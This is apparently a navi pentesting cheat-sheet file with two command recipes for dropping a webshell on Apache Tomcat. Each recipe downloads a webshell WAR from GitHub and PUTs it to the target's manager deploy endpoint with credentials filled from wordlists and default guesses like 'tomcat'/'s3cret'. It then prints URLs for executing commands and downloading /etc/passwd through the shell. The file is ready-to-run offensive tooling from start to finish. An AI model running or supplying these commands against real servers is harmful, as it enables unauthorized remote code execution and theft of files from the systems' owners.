% sealldev, tomcat, cve
; From https://github.com/sealldeveloper/navi-cheats/

# Drop Tomcat Webshell (9.0 or older)
; Further usage info on https://github.com/p0dalirius/Tomcat-webshell-application
wget "https://github.com/p0dalirius/Tomcat-webshell-application/releases/download/1.3.0/tomcat-webshells.zip" -q && \
7z x tomcat-webshells.zip -bso0 -bsp0 && \
rm tomcat-webshells.zip && \
rm -r tomcat_10_and_upper && \
curl -u <username>:<password> -X PUT --upload-file ./tomcat_9_and_lower/dist/1.3.0/webshell.war "http://<ip>:<port>/manager/text/deploy?path=/webshell&update=true" &&
rm -r tomcat_9_and_lower &&
echo -e "Interact with it at http://<ip>:<port>/webshell/api.jsp?action=exec&cmd=whoami\nFiles downloadable: http://<ip>:<port>/webshell/api.jsp?action=download&cmd=/etc/passwd"

# Drop Tomcat Webshell (10.0 or older)
; Further usage info on https://github.com/p0dalirius/Tomcat-webshell-application
wget "https://github.com/p0dalirius/Tomcat-webshell-application/releases/download/1.3.0/tomcat-webshells.zip" -q && \
7z x tomcat-webshells.zip -bso0 -bsp0 && \
rm tomcat-webshells.zip && \
rm -r tomcat_9_and_lower && \
curl -u <username>:<password> -X PUT --upload-file ./tomcat_10_and_upper/dist/1.3.0/webshell.war "http://<ip>:<port>/manager/text/deploy?path=/webshell&update=true" &&
rm -r tomcat_10_and_upper &&
echo -e "Interact with it at http://<ip>:<port>/webshell/api.jsp?action=exec&cmd=whoami\nFiles downloadable: http://<ip>:<port>/webshell/api.jsp?action=download&cmd=/etc/passwd"


$ username: if [[ -f "users.txt" ]]; then cat users.txt; echo -e "tomcat\n"; fi
$ password: if [[ -f "passwords.txt" ]]; then cat passwords.txt; echo -e "s3cret\n"; fi
$ ip: if [[ -f "ips.txt" ]]; then cat ips.txt; fi